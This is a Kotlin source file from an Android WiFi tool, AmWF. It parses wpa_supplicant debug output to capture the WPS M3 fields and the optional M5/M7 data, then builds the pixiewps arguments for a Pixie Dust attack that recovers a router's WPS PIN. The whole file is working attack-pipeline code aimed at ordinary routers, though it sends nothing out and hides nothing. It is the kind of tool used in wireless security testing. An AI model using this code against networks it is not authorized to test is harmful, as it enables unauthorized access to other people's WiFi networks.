/*
 * AmWF - Android WiFi Monitor Mode Controller
 * Copyright (C) 2026 Hitomatito
 *
 * SPDX-License-Identifier: GPL-3.0-or-later
 */

package com.hitomatito.amwf.wifi.pixiedust

import java.io.BufferedReader

/**
 * Parser de los campos del mensaje WPS M3 extraídos del debug de wpa_supplicant.
 *
 * wpa_supplicant con el flag -K vuelca las claves WPS por su salida de debug.
 * Este parser extrae los seis valores necesarios para el ataque Pixie Dust:
 *   - E-Nonce (nonce del enrollee)
 *   - PKE  (clave pública DH del peer / enrollee)
 *   - PKR  (clave pública DH propia / registrador)
 *   - AuthKey
 *   - E-Hash1
 *   - E-Hash2
 *
 * Soporta ambos formatos de línea que wpa_supplicant puede emitir:
 *   1) Formato clave=valor:  WPS-M3: ENONCE=.... PKE=.... PKR=.... AUTHKEY=.... EHASH1=.... EHASH2=....
 *   2) Formato hexdump:      WPS: Enrollee Nonce: hex...
 *
 * Esta es una implementación original de AmWF (licencia GPL-3.0-or-later).
 */
object M3Parser {

    private const val TAG = "M3Parser"

    /** Los seis campos del M3, en orden de aparición esperado. */
    private enum class M3Field(val label: String) {
        ENROLLEE_NONCE("Enrollee Nonce"),
        OWN_PUBLIC_KEY("DH own Public Key"),
        PEER_PUBLIC_KEY("DH peer Public Key"),
        AUTH_KEY("AuthKey"),
        E_HASH_1("E-Hash1"),
        E_HASH_2("E-Hash2");

        override fun toString(): String = label
    }

    /** Longitud mínima esperada de un valor hexadecimal válido. */
    private const val MIN_HEX_LENGTH = 32

    /** Tiempo de espera adicional (ms) tras capturar los 6 campos para intentar
     *  capturar también M5/M7 (modo 3, chips RTL819x). */
    private const val M5M7_DWELL_MS = 4_000L

    private val WPS_M3_PREFIX = "WPS-M3: "
    private val M5_PREFIX = "WPS-M5:"
    private val M7_PREFIX = "WPS-M7:"

    // Formato clave=valor: ENONCE=..., PKE=..., etc.
    private val KEY_VALUE = Regex("""([A-Z0-9]+)=([0-9a-fA-F]+)""")
    private val BSSID_VALUE = Regex("""BSSID=([0-9a-fA-F]{2}(:[0-9a-fA-F]{2}){5})""")
    private val ENCR_VALUE = Regex("""ENCR=([0-9a-fA-F]+)""")

    // Formato hexdump: "WPS: Enrollee Nonce: 1a 2b 3c ..."
    private val FIELD_LINE = Regex("""WPS:\s*([A-Za-z ]+):\s*([0-9a-fA-F :]+)""")

    /**
     * Resultado del parseo del M3.
     */
    sealed class M3Capture {
        data class Complete(
            val data: M3Data,
            val m5m7: M5M7Capture? = null
        ) : M3Capture()
        data class Incomplete(
            val capturedCount: Int,
            val missing: List<String>
        ) : M3Capture()
    }

    /**
     * Los seis campos M3 necesarios para ejecutar pixiewps.
     */
    data class M3Data(
        val enrolleeNonce: String,
        val ownPublicKey: String,
        val peerPublicKey: String,
        val authKey: String,
        val eHash1: String,
        val eHash2: String
    ) {
        /** Argumentos de línea de comandos para pixiewps (modo estándar). */
        fun toPixiewpsArgs(): String =
            "--pke $peerPublicKey --pkr $ownPublicKey --e-hash1 $eHash1 " +
                    "--e-hash2 $eHash2 --authkey $authKey --e-nonce $enrolleeNonce"
    }

    /**
     * Datos opcionales M5/M7 para el modo 3 de pixiewps (chips RTL819x).
     */
    data class M5M7Capture(
        val bssid: String = "",
        val m5Enc: String? = null,
        val m7Enc: String? = null
    ) {
        fun hasBoth(): Boolean = m5Enc != null && m7Enc != null

        fun toPixiewpsMode3Args(m3: M3Data): String =
            "--mode 3 ${m3.toPixiewpsArgs()}" +
                    (m5Enc?.let { " -5 $it" } ?: "") +
                    (m7Enc?.let { " -7 $it" } ?: "")
    }

    /**
     * Lee el stream de debug de wpa_supplicant y extrae los campos M3 (y opcionalmente M5/M7).
     *
     * @param reader Lectura de la salida de wpa_supplicant.
     * @param timeoutMs Tiempo máximo de espera en ms.
     * @param cancelRequested Función que retorna true si se debe cancelar.
     * @param onLine Callback opcional con cada línea leída (para logging).
     * @param onM5M7 Callback opcional cuando se capturan M5 y M7.
     */
    fun parse(
        reader: BufferedReader,
        timeoutMs: Long = 25_000L,
        cancelRequested: () -> Boolean = { false },
        onLine: ((String) -> Unit)? = null,
        onM5M7: ((M5M7Capture) -> Unit)? = null
    ): M3Capture {
        val fields = arrayOfNulls<String>(6)
        val deadline = System.currentTimeMillis() + timeoutMs
        var counted = 0
        var m5: String? = null
        var m7: String? = null
        var bssid = ""
        var m5m7Notified = false
        var completeReturnAt = Long.MAX_VALUE

        while (System.currentTimeMillis() < deadline &&
            System.currentTimeMillis() < completeReturnAt
        ) {
            if (cancelRequested()) {
                return M3Capture.Incomplete(counted, missingFields(fields))
            }

            try {
                if (!reader.ready()) {
                    Thread.sleep(50)
                    continue
                }
                val line = reader.readLine() ?: break
                if (line.isEmpty()) continue
                onLine?.invoke(line)

                // Formato 1: línea WPS-M3: con pares clave=valor
                if (line.startsWith(WPS_M3_PREFIX)) {
                    bssid = BSSID_VALUE.find(line)?.groupValues?.get(1) ?: bssid
                    parseKeyValueLine(line, fields) { counted++ }
                    if (counted == 6) {
                        completeReturnAt = System.currentTimeMillis() + M5M7_DWELL_MS
                    }
                    continue
                }

                // Formato 2: líneas hexdump individuales "WPS: <Campo>: <hex>"
                val fieldMatch = FIELD_LINE.find(line)
                if (fieldMatch != null) {
                    val fieldLabel = fieldMatch.groupValues[1].trim()
                    val hexValue = fieldMatch.groupValues[2].replace(" ", "").replace(":", "")
                    val field = fieldForLabel(fieldLabel)
                    if (field != -1 && fields[field] == null) {
                        if (hexValue.length >= MIN_HEX_LENGTH) {
                            fields[field] = hexValue
                            counted++
                            if (counted == 6) {
                                completeReturnAt = System.currentTimeMillis() + M5M7_DWELL_MS
                            }
                        }
                    }
                    continue
                }

                // Captura opcional M5/M7 para modo 3 (RTL819x)
                if (line.startsWith(M5_PREFIX)) {
                    m5 = ENCR_VALUE.find(line)?.groupValues?.get(1)
                    bssid = BSSID_VALUE.find(line)?.groupValues?.get(1) ?: bssid
                    m5m7Notified = maybeNotifyM5M7(onM5M7, m5m7Notified, bssid, m5, m7)
                    continue
                }
                if (line.startsWith(M7_PREFIX)) {
                    m7 = ENCR_VALUE.find(line)?.groupValues?.get(1)
                    bssid = BSSID_VALUE.find(line)?.groupValues?.get(1) ?: bssid
                    m5m7Notified = maybeNotifyM5M7(onM5M7, m5m7Notified, bssid, m5, m7)
                    continue
                }
            } catch (e: Exception) {
                return M3Capture.Incomplete(counted, missingFields(fields))
            }
        }

        return if (counted == 6) {
            M3Capture.Complete(
                data = M3Data(
                    enrolleeNonce = fields[0]!!,
                    ownPublicKey = fields[1]!!,
                    peerPublicKey = fields[2]!!,
                    authKey = fields[3]!!,
                    eHash1 = fields[4]!!,
                    eHash2 = fields[5]!!
                ),
                m5m7 = if (m5 != null && m7 != null) M5M7Capture(bssid, m5, m7) else null
            )
        } else {
            M3Capture.Incomplete(counted, missingFields(fields))
        }
    }

    private fun fieldForLabel(label: String): Int {
        return when (label) {
            "Enrollee Nonce" -> M3Field.ENROLLEE_NONCE.ordinal
            "DH own Public Key" -> M3Field.OWN_PUBLIC_KEY.ordinal
            "DH peer Public Key" -> M3Field.PEER_PUBLIC_KEY.ordinal
            "AuthKey" -> M3Field.AUTH_KEY.ordinal
            "E-Hash1" -> M3Field.E_HASH_1.ordinal
            "E-Hash2" -> M3Field.E_HASH_2.ordinal
            else -> -1
        }
    }

    private fun parseKeyValueLine(line: String, fields: Array<String?>, onCaptured: () -> Unit) {
        for (match in KEY_VALUE.findAll(line)) {
            val key = match.groupValues[1]
            val value = match.groupValues[2]
            val field = when (key) {
                "ENONCE" -> M3Field.ENROLLEE_NONCE.ordinal
                "PKE" -> M3Field.PEER_PUBLIC_KEY.ordinal
                "PKR" -> M3Field.OWN_PUBLIC_KEY.ordinal
                "AUTHKEY" -> M3Field.AUTH_KEY.ordinal
                "EHASH1" -> M3Field.E_HASH_1.ordinal
                "EHASH2" -> M3Field.E_HASH_2.ordinal
                else -> -1
            }
            if (field == -1 || fields[field] != null) continue
            if (value.length < MIN_HEX_LENGTH) continue
            fields[field] = value
            onCaptured()
        }
    }

    private fun missingFields(fields: Array<String?>): List<String> {
        val names = listOf(
            M3Field.ENROLLEE_NONCE.name,
            M3Field.OWN_PUBLIC_KEY.name,
            M3Field.PEER_PUBLIC_KEY.name,
            M3Field.AUTH_KEY.name,
            M3Field.E_HASH_1.name,
            M3Field.E_HASH_2.name
        )
        return fields.mapIndexed { index, value ->
            if (value == null) names[index] else null
        }.filterNotNull()
    }

    private fun maybeNotifyM5M7(
        callback: ((M5M7Capture) -> Unit)?,
        alreadyNotified: Boolean,
        bssid: String,
        m5: String?,
        m7: String?
    ): Boolean {
        if (callback == null || alreadyNotified || m5 == null || m7 == null) {
            return alreadyNotified
        }
        callback(M5M7Capture(bssid, m5, m7))
        return true
    }
}
